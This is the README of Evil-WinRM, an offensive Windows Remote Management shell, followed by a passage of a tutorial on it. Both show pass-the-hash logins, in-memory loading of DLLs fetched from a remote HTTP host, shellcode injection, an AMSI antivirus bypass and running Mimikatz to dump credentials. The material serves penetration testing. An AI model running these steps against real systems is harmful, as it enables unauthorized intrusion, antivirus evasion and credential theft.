# Evil-WinRM [![Version-shield](https://camo.githubusercontent.com/7e07730a5f20d9b22323ed8b15abc98a21e5d6e6cd02315d3b7cbbe51618dca3/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f76657273696f6e2d332e352d626c75652e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d303039336565 "Latest version")](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb) [![Ruby2.3-shield](https://camo.githubusercontent.com/068f399a72853bf2b0a288795ef2df7fc4ba3d14f57534242c7623b38b3f7565/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f727562792d322e332532422d626c75652e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d666630303030 "Ruby 2.3 or later")](https://www.ruby-lang.org/en/news/2015/12/25/ruby-2-3-0-released/) [![Gem-Version](https://camo.githubusercontent.com/f646917c45993deee69944e28d778b644c027280efb6e68085dbae4c83b4d7b3/68747470733a2f2f62616467652e667572792e696f2f72622f6576696c2d77696e726d2e737667 "Ruby gem")](https://rubygems.org/gems/evil-winrm) [![License-shield](https://camo.githubusercontent.com/824518a71b5613de4e89076832ab54d26b37be637ad440ef5a219592bd14ab74/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d4c47504c25323076332532422d626c75652e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d626430303030 "LGPL v3+")](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE) [![Docker-shield](https://camo.githubusercontent.com/392fdc099be7a82ca449f44457026ba4eda2dc82c280c7e853ff37f2c504d26f/68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f636c6f75642f6175746f6d617465642f6f73636172616b61656c7669732f6576696c2d77696e726d2e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d613961396139 "Docker rules!")](https://hub.docker.com/r/oscarakaelvis/evil-winrm)

[](https://github.com/Hackplayers/evil-winrm#evil-winrm-----)

The ultimate WinRM shell for hacking/pentesting

[![Banner](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png)](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png)

## Description & Purpose

[](https://github.com/Hackplayers/evil-winrm#description--purpose)

This shell is the ultimate WinRM shell for hacking/pentesting.

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.

It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.

## Features

[](https://github.com/Hackplayers/evil-winrm#features)

- Compatible to Linux and Windows client systems
- Load in memory Powershell scripts
- Load in memory dll files bypassing some AVs
- Load in memory C# (C Sharp) assemblies bypassing some AVs
- Load x64 payloads generated with awesome [donut](https://github.com/TheWover/donut) technique
- Dynamic AMSI Bypass to avoid AV signatures
- Pass-the-hash support
- Kerberos auth support
- SSL and certificates support
- Upload and download files showing progress bar
- List remote machine services without privileges
- Command History
- WinRM command completion
- Local files/directories completion
- Remote path (files/directories) completion (can be disabled optionally)
- Colorization on prompt and output messages (can be disabled optionally)
- Optional logging feature
- Docker support (prebuilt images available at [Dockerhub](https://hub.docker.com/r/oscarakaelvis/evil-winrm))
- Trap capturing to avoid accidental shell exit on Ctrl+C

## Help

[](https://github.com/Hackplayers/evil-winrm#help)

```
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message

```

## Requirements

[](https://github.com/Hackplayers/evil-winrm#requirements)

Ruby 2.3 or higher is needed. Some ruby gems are needed as well: `winrm >=2.3.2`, `winrm-fs >=1.3.2`, `stringio >=0.0.2`, `logger >= 1.4.3`, `fileutils >= 0.7.2`. Depending of your installation method (4 availables) the installation of them could be required to be done manually.

Another important requirement only used for Kerberos auth is to install the Kerberos package used for network authentication. For some Linux like Debian based (Kali, Parrot, etc.) it is called `krb5-user`. For BlackArch it is called `krb5` and probably it could be called in a different way for other Linux distributions.

The remote path completion feature will work only if your ruby was compiled enabling the `--with-readline-dir` flag. This is enabled by default in ruby included on some Linux distributions but not in all. Check [the section below](https://github.com/Hackplayers/evil-winrm#Remote-path-completion) for more info.

## Installation & Quick Start (4 methods)

[](https://github.com/Hackplayers/evil-winrm#installation--quick-start-4-methods)

### Method 1. Installation directly as ruby gem (dependencies will be installed automatically on your system)

[](https://github.com/Hackplayers/evil-winrm#method-1-installation-directly-as-ruby-gem-dependencies-will-be-installed-automatically-on-your-system)

- Step 1. Install it (it will install automatically dependencies): `gem install evil-winrm`
- Step 2. Ready. Just launch it!

```
evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### Method 2. Git clone and install dependencies on your system manually

[](https://github.com/Hackplayers/evil-winrm#method-2-git-clone-and-install-dependencies-on-your-system-manually)

- Step 1. Install dependencies manually: `sudo gem install winrm winrm-fs stringio logger fileutils`
- Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
- Step 3. Ready. Just launch it!

```
cd evil-winrm && ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### Method 3. Using bundler (dependencies will not be installed on your system, just to use evil-winrm)

[](https://github.com/Hackplayers/evil-winrm#method-3-using-bundler-dependencies-will-not-be-installed-on-your-system-just-to-use-evil-winrm)

- Step 1. Install bundler: `gem install bundler`
- Step 2. Clone the repo: `git clone https://github.com/Hackplayers/evil-winrm.git`
- Step 3. Install dependencies with bundler: `cd evil-winrm && bundle install --path vendor/bundle`
- Step 4. Launch it with bundler:

```
bundle exec evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
```

### Method 4. Using Docker

[](https://github.com/Hackplayers/evil-winrm#method-4-using-docker)

- Step 1. Launch docker container based on already built image:

```
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'
```

## Documentation

[](https://github.com/Hackplayers/evil-winrm#documentation)

### Clear text password

[](https://github.com/Hackplayers/evil-winrm#clear-text-password)

If you don't want to put the password in clear text, you can optionally avoid to set `-p` argument and the password will be prompted preventing to be shown.

### Ipv6

[](https://github.com/Hackplayers/evil-winrm#ipv6)

To use IPv6, the address must be added to /etc/hosts. Just put the already set name of the host after `-i` argument instead of an IP address.

### Basic commands

[](https://github.com/Hackplayers/evil-winrm#basic-commands)

- **upload**: local files can be auto-completed using tab key.
    - usage: `upload local_filename` or `upload local_filename destination_filename`
- **download**:
    - usage: `download remote_filename` or `download remote_filename destination_filename`

**Notes about paths (upload/download)**: Relative paths are not allowed to use on download/upload. Use filenames on current directory or absolute path. If you are using Evil-WinRM in a docker environment, bear in mind that all local paths should be at `/data` and be pretty sure that you mapped it as a volume in order to be able to access to downloaded files or to be able to upload files from your local host O.S.

- **services**: list all services showing if there your account has permissions over each one. No administrator permissions needed to use this feature.
- **menu**: load the `Invoke-Binary`, `Dll-Loader` and `Donut-Loader` functions that we will explain below. When a ps1 is loaded all its functions will be shown up.

```
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Dll-Loader
[+] Donut-Loader
[+] Invoke-Binary
[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] menu
[+] exit

```

### Load powershell scripts

[](https://github.com/Hackplayers/evil-winrm#load-powershell-scripts)

- To load a ps1 file you just have to type the name (auto-completion using tab allowed). The scripts must be in the path set at `-s` argument. Type menu again and see the loaded functions. Very large files can take a long time to be loaded.

```
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> menu

   ,.   (   .      )               "            ,.   (   .      )       .
  ("  (  )  )'     ,'             (     '    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Add-DomainAltSecurityIdentity
[+] Add-DomainGroupMember
[+] Add-DomainObjectAcl
[+] Add-RemoteConnection
[+] Add-Win32Type
[+] Convert-ADName
[+] Convert-DNSRecord
[+] ConvertFrom-LDAPLogonHours
[+] ConvertFrom-SID
[+] ConvertFrom-UACValue
[+] Convert-LDAPProperty
[+] Convert-LogonHours
[+] ConvertTo-SID
[+] Dll-Loader
[+] Donut-Loader
[+] Export-PowerViewCSV
[+] field
[+] Find-DomainLocalGroupMember
```

### Advanced commands

[](https://github.com/Hackplayers/evil-winrm#advanced-commands)

- Invoke-Binary: allows .Net assemblies to be executed in memory. The name can be auto-completed using tab key. Arguments for the exe file can be passed comma separated. Example: `Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'`. The executables must be in the path set at `-e` argument.

```
*Evil-WinRM* PS C:\> Invoke-Binary
.SYNOPSIS
    Execute binaries from memory.
    PowerShell Function: Invoke-Binary
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Invoke-Binary /opt/csharp/Watson.exe
    Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3
    Invoke-Binary /opt/csharp/Binary.exe 'param1, param2, param3'
    Description
    -----------
    Function that execute binaries from memory.

*Evil-WinRM* PS C:\> Invoke-Binary /opt/csharp/Rubeus.exe

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


 Ticket requests and renewals:


```

- Dll-Loader: allows loading dll libraries in memory, it is equivalent to: `[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("pwn.dll"))`
    
    The dll file can be hosted by smb, http or locally. Once it is loaded type `menu`, then it is possible to autocomplete all functions.
    

```
*Evil-WinRM* PS C:\> Dll-Loader
.SYNOPSIS
    dll loader.
    PowerShell Function: Dll-Loader
    Author: Hector de Armas (3v4Si0N)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION
    .
.EXAMPLE
    Dll-Loader -smb -path \\192.168.139.132\\share\\myDll.dll
    Dll-Loader -local -path C:\Users\Pepito\Desktop\myDll.dll
    Dll-Loader -http -path http://example.com/myDll.dll

    Description
    -----------
    Function that loads an arbitrary dll

*Evil-WinRM* PS C:\> Dll-Loader -http http://10.10.10.10/SharpSploit.dll
[+] Reading dll by HTTP
[+] Loading dll...
*Evil-WinRM* PS C:\Users\test\Documents> menu

 [... Snip ...]

*Evil-WinRM* PS C:\> [SharpSploit.Enumeration.Host]::GetProcessList()


Pid          : 0
Ppid         : 0
Name         : Idle
Path         :
SessionID    : 0
Owner        :
Architecture : x64

```

- Donut-Loader: allows to inject x64 payloads generated with awesome [donut](https://github.com/TheWover/donut) technique. No need to encode the payload.bin, just generate and inject!

```
*Evil-WinRM* PS C:\> Donut-Loader
.SYNOPSIS
    Donut Loader.
    PowerShell Function: Donut-Loader
    Author: Luis Vacas (CyberVaca)
    Based code: TheWover

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin
    Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin

    Description
    -----------
    Function that loads an arbitrary donut :D
```

You can use this [donut-maker](https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py) to generate the payload.bin if you don't use Windows. This script use a python module written by Marcello Salvati ([byt3bl33d3r](https://twitter.com/byt3bl33d3r)). It could be installed using pip: `pip3 install donut-shellcode`

```
python3 donut-maker.py -i Covenant.exe

   ___  _____
 .'/,-Y"     "~-.
 l.Y             ^.
 /\               _\_      Donuts!
i            ___/"   "\
|          /"   "\   o !
l         ]     o !__./
 \ _  _    \.___./    "~\
  X \/ \            ___./
 ( \ ___.   _..--~~"   ~`-.
  ` Z,--   /               \
    \__.  (   /       ______)
      \   l  /-----~~" /
       Y   \          /
       |    "x______.^
       |           \
       j            Y



[+] Donut generated successfully: payload.bin
```

- Bypass-4MSI: patchs AMSI protection.

```
*Evil-WinRM* PS C:\> #amsiscanbuffer
At line:1 char:1
+ #amsiscanbuffer
+ ~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\>
*Evil-WinRM* PS C:\> Bypass-4MSI
[+] Success!

*Evil-WinRM* PS C:\> #amsiscanbuffer
*Evil-WinRM* PS C:\>
```

### Kerberos

[](https://github.com/Hackplayers/evil-winrm#kerberos)

- First you have to sync date with the DC: `rdate -n <dc_ip>`
    
- To generate ticket there are many ways:
    
    - Using [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from impacket
    - If you get a kirbi ticket using [Rubeus](https://github.com/GhostPack/Rubeus) or [Mimikatz](https://github.com/gentilkiwi/mimikatz) you have to convert to ccache using [ticket_converter.py](https://github.com/Zer1t0/ticket_converter)
- Add ccache ticket. There are 2 ways:
    
    `export KRB5CCNAME=/foo/var/ticket.ccache`
    
    `cp ticket.ccache /tmp/krb5cc_0`
    
- Add realm to `/etc/krb5.conf` (for linux). Use of this format is important:
    
    ```
     CONTOSO.COM = {
                 kdc = fooserver.contoso.com
     }
    ```
    
- Check Kerberos tickets with `klist`
    
- To remove ticket use: `kdestroy`
    
- For more information about Kerberos check this [cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
    

### Remote path completion

[](https://github.com/Hackplayers/evil-winrm#remote-path-completion)

This feature could be not available depending of the ruby you are using. It must be compiled with readline support. Otherwise, this feature will not work (a warning will be shown).

#### Method 1 (compile the needed extension)

[](https://github.com/Hackplayers/evil-winrm#method-1-compile-the-needed-extension)

Using this method you'll compile ruby with the needed readline feature but to use only the library without changing the default ruby version on your system. Because of this, is the most recommended method.

Let's suppose that you have in your Debian based system ruby 2.7.3:

```
# Install needed package
apt install libreadline-dev

# Check your ruby version
ruby --version
ruby 2.7.3p183 (2021-04-05 revision 6847ee089d) [x86_64-linux-gnu]

# Download ruby source code (2.7.3 in this case):
wget https://ftp.ruby-lang.org/pub/ruby/2.7/ruby-2.7.3.tar.gz

# Extract source code
tar -xf ruby-2.7.3.tar.gz

# Compile the readline extension:
cd ruby-2.7.3/ext/readline
ruby ./extconf.rb
make

# Patch current version of the ruby readline extension:
sudo cp /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so.bk
sudo cp -f readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so
```

#### Method 2 (Install ruby to use it only for evil-winrm using rbenv)

[](https://github.com/Hackplayers/evil-winrm#method-2-install-ruby-to-use-it-only-for-evil-winrm-using-rbenv)

Let's suppose that you want ruby 2.7.1 on a Debian based Linux and you are using zsh. This script will automatize it. You'll need to launch it from the same dir where evil-winrm.rb and Gemfile is located (the evil-winrm created dir after a git clone for example):

```
#!/usr/bin/env zsh

# Uninstall possible current installed versions
sudo gem uninstall evil-winrm -q
gem uninstall evil-winrm -q

# Install rbenv
sudo apt install rbenv

# Config rbenv on zshrc config file
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.zshrc
echo 'eval "$(rbenv init -)"' >> ~/.zshrc
source ~/.zshrc

# Install ruby with readline support
export RUBY_CONFIGURE_OPTS=--with-readline-dir="/usr/include/readline"
rbenv install 2.7.1

# Create file '.ruby-version' to set right ruby version
rbenv local 2.7.1

# Install local gems
gem install bundler
bundle install

current_evwr="$(pwd)/evil-winrm.rb"

sudo bash -c "cat << 'EOF' > /usr/bin/evil-winrm
    #!/usr/bin/env sh
    "${current_evwr}" "\$@"
EOF"

sudo chmod +x /usr/bin/evil-winrm
```

Then you can safely launch evil-winrm using the new installed ruby with the required readline support from any location.

#### Method 3 (compile entire ruby)

[](https://github.com/Hackplayers/evil-winrm#method-3-compile-entire-ruby)

If you want to compile it yourself, you can follow these steps. Let's suppose that you want ruby 2.7.3:

```
wget -O ruby-install-0.8.1.tar.gz https://github.com/postmodern/ruby-install/archive/v0.8.1.tar.gz
tar -xzvf ruby-install-0.8.1.tar.gz
cd ruby-install-0.8.1/
sudo make install
ruby-install ruby 2.7.3 -- --with-readline-dir=/usr/include/readline
```

Depending of your system it will be installed at `/opt/rubies/ruby-2.7.3` or maybe at  `~/.rubies/ruby-2.7.3`.

Now just need to install evil-winrm dependencies for that new installed ruby version. The easiest way is to launch command `/opt/rubies/ruby-2.7.3/bin/gem install evil-winrm`. The gem command used must be belonging to the new ruby installation.

After that, you can launch safely your new installed ruby to use it on evil-winrm: `/opt/rubies/ruby-2.7.3/bin/ruby ./evil-winrm.rb -h`

It is recommended to use this new installed ruby only to launch evil-winrm. If you set it up as your default ruby for your system, bear in mind that it has no dependency gems installed. Some ruby based software like Metasploit or others could not start correctly due dependencies problems.

### Logging

[](https://github.com/Hackplayers/evil-winrm#logging)

This feature will create files on your $HOME dir saving commands and the outputs of the WinRM sessions

## Changelog:

[](https://github.com/Hackplayers/evil-winrm#changelog)

Changelog and project changes can be checked here: [CHANGELOG.md](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/CHANGELOG.md)

## Credits:

[](https://github.com/Hackplayers/evil-winrm#credits)

Staff:

- [Cybervaca](https://github.com/cybervaca), (founder). Twitter: [@CyberVaca_](https://twitter.com/CyberVaca_)
- [OscarAkaElvis](https://github.com/OscarAkaElvis), Twitter: [@OscarAkaElvis](https://twitter.com/OscarAkaElvis)
- [Jarilaos](https://github.com/jarilaos), Twitter: [@_Laox](https://twitter.com/_Laox)
- [arale61](https://github.com/arale61), Twitter: [@arale61](https://twitter.com/arale61)

Hat tip to:

- [Vis0r](https://github.com/vmotos) for his personal support.
- [Alamot](https://github.com/Alamot) for his original code.
- [3v4Si0N](https://github.com/3v4Si0N) for his awesome dll loader.
- [WinRb](https://github.com/WinRb/WinRM/graphs/contributors) All contributors of ruby library.
- [TheWover](https://github.com/TheWover) for his awesome donut tool.
- [byt3bl33d3r](https://twitter.com/byt3bl33d3r) for his python library to create donut payloads.
- [Sh11td0wn](https://github.com/Sh11td0wn) for inspiration about new features.
- [Borch](https://github.com/Stoo0rmq) for his help adding logging feature.
- [Hackplayers](https://www.hackplayers.com/) for giving a shelter on their github to this software.

## Disclaimer & License

[](https://github.com/Hackplayers/evil-winrm#disclaimer--license)

This script is licensed under LGPLv3+. Direct link to [License](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE).

Evil-WinRM should be used for authorized penetration testing and/or nonprofit educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own servers and/or with the server owner's permission.

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/Hackplayers/evil-winrm). Be sure to check out the original post for more details.

# A Detailed Guide on Evil-Winrm

[January 16, 2023](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/) by [Raj](https://www.hackingarticles.in/author/raj/)

### Background

Evil-winrm tool is originally written by the team Hackplayers. The purpose of this tool is to make penetration testing easy as possible especially in the Microsoft Windows environment. Evil-winrm works with PowerShell remoting protocol (PSRP). System and network administrators often use Windows Remote Management protocol to upload, edit and upload. WinRM is a SOAP-based, and firewall-friendly protocol that works with HTTP transport over the default HTTP port 5985. For more information about PowerShell remoting, consider visiting Microsoft’s official site.

**[https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.3](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enable-psremoting?view=powershell-7.3)**

### Table of Content

- Introduction to Evil-winrm
- Winrm Service Discovery
- Evil-winrm Help – List Available Features
- Login With Plain Texted Password
- Login with Plain Texted Password – SSL Enabled
- Login with NTLM Hash -Pass The Hash Attack
- Load Powershell Script
- Store logs with Evil-winrm
- Disable Remote Path Completion
- Disable Coloured Interface
- Run Executables File
- Service Enumeration with Evil-winrm
- File Transfer with Evil-winrm
- Use Evil-winrm From Docker
- Login with the key using Evil-winrm
- Conclusion

### Introduction to Evil-winrm

Evil-winrm open-sourced tool written in ruby language making post exploitation easy as possible. This tool comes with many cool features which include remote login with plain texted password, SSL encrypted login, login with NTLM hash, login with keys, file transfer, logs store etc. The authors of the tool keep updating this tool and adding many new features which made Internal assessment easier. Using evil-winrm, we get a PowerShell session of the remote host. This tool comes with all modern Kali Linux but if you wish to download then you can download it from its official git repository.

Download Link: **[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)**

### Winrm Service Discovery

As we have discussed earlier that the evil-winrm tool is used if the Winrm service is enabled in the remote host. To confirm, we can look for the two default winrm service ports 5895 and 5896 open or not using nmap. From the nmap result, we found that winrm service is enabled so we can use evil-winrm to log in and perform other tasks which we are going to explore in the lateral phases.

nmap -p 5985,5986 192.168.1.19

### ![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhX4BH15fcVaS2fdbUP9yAHYbe3eXmcq9k3TbJKV2a5wxi7UoVhBauzHA4jytwcDp8Uon-C8N3LY_vwUF3HPvAxWq_R6Z6dzeLpIlCaLDrNyxE8U8u_x1LjgU_jyUKyGmXNWppSe26DTMj6eDZG9AgeVYC2i1H93WXvs7VcmYAjaT4S9kuy0FoxzK04lg/s16000/1.png)

### Evil-winrm Help – List Available Features

Many penetration testers and the CTF players have used this tool quite often during internal assessments but still many of us are unaware of the tool’s extra features which can make our assessment much easier than ever.  To list the all-available cool features of the evil-winrm, we can simply use **-h** flag and that will list all the help commands with descriptions.  We are going to cover as much as possible in this article and encourage everyone to play with other features as well.

evil-winrm -h

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQ-4N3NZHMJBIWWT0L_lVGyFOo_DiW7Nr3Ls6pFNVxAraW_jB6xVTZdLGhj1xBtEE-9ewTcxXjIg6Lfmznte1mCgqIqY7QsBF4Cmg7ySzMhBlygKghOKBFsDXja-lCfbMOGoYZVmuyQoeAJ0JclL4_9pbCkieAKhKXs-fbHV-t1yfkytreQgAfCkHNnA/s16000/2.png)

### Login With Plain Texted Password

Suppose we have obtained a plain texted password during the enumeration phase, and we noticed that winrm service is enabled in the remote host. Then we can take a remote session on the target system using evil-winrm by issuing the IP address of the remote host with **-i** flag, username with **-u** flag and the password with **-p** flag. In the below picture, we can see that it has established a remote PowerShell session.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhe_SzAv7Joh2me4Vdofre2DZPcSfjJo-DNbmszEL9vXdasM2jfdHpSirMRmlulEYgc4epMngwA0k5lIjIXGkrMIprSC6rDyrvLHEAMXR95lmpY9ny3D1uYITo-0j-R1q-lrR4ikpfMaIw6khGe1-SXuZNFAn3kghszaGNMjK6FkWWYnkyd7thuzBmaGw/s16000/4.png)

### Login with Plain Texted Password – SSL Enabled

As we have mentioned earlier that the winrm service transports traffic over the HTTP protocol then we can use Secure Socket Layer (SSL) feature to make the connection secure. Once we enable the SSL feature then our data will be delivered over an encrypted secure socket layer. With evil-winrm, we can achieve the objective using **-S** flag along with our previous command that we used to establish a connection to the remote host.

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -S

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhOAfaCC9m4qMV4FjurV12Qfo3U3OHMA7ngvltegNDXW2tBLZYfh7CwNm3FwGjgpEgYBpPR1hFkx5RWNeIndABKy6Ze6HVZkli-InYrgIQy2y1668xASOnJIXqkltEY51pU9C9ym41NZHI-AaG9PPSEOUCD1pieoKzprAHvmiHAF4u3F4ME2Nfk7-0xFQ/s16000/5.png)

### Login with NTLM Hash -Pass The Hash Attack

During the internal assessment or solving any CTF related to windows privilege escalation and Active Directory exploitation, we often get NTLM hash by using our exploits and the attacks. If we are in the windows environment, we can utilise evil-winrm to establish a PowerShell session by performing pass the hash attack where we issue hash as a password instead of using a plain texted password. Apart from that, this attack also supports other protocols as well. We can pass the hash using **-H** flag along with the command we used earlier replacing the password section with the hash. More detailed guide about the pass-the-hash attack is available in the below link:

**[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)**

evil-winrm -i 192.168.1.19 -u administrator -H 32196B56FFE6F45E294117B91A83BF38

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUT9NJqZ1mSnsVg7Fh8R1r_9t0PP5nZPzTf1ya17cXkZJKVTjgk4a9ixFLVKHkH9yfNnCcrpgS1aGk1S7Om46RPCpiGKqd2CjRtorV3Uiwyk0TYfj4MvKDS2hu0_qYOszrP7cfcwxmDOJFF5hy-1_n33pQ6weSm4HAAkanY6navDEYprIoZH8MSVghug/s16000/6.png)

### Load Powershell Script

Evil-winrm also comes up with a feature which allows us to use scripts from our base machine. We can directly load scripts directly into the memory using **-s** flag along with the script file path where we have stored scripts I our local machine. Furthermore, it also comes up with AMSI feature which we often require before importing any script. In the below example, we are bypassing AMSI then directly calling Invoke-Mimiktz.ps1 script from our system to the target machine and loading it into the memory. After that, we can use any mimikatz command. For demonstration purpose, here we have dumped credentials from the cache. After dumping credentials, we can perform pass the hash attack with obtained NTLM hash again. Follow the steps below to reproduce the attack with evil-winrm.

**[https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1)**

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtxyXy0DyqxFEfaQ3iU9DY4WC5Q2hM0KomwWy7NMR_N-FXPBGJbKgNtyvOe-1i2lQJxFjzzqRyeBlAkMLE3lUWlJW4FJcKtO3lmPWjPXhiJ5mzxpOIqwnfSMALTns0caf1BWeuQCQTRip75vpLRTHBbTQKQZH0mwIjkw82pIJB7h1L4d1spn8mfoXa4Q/s16000/7.png)

evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell

Bypass-4MSI

Invoke-Mimikatz.ps1

Invoke-Mimikatz

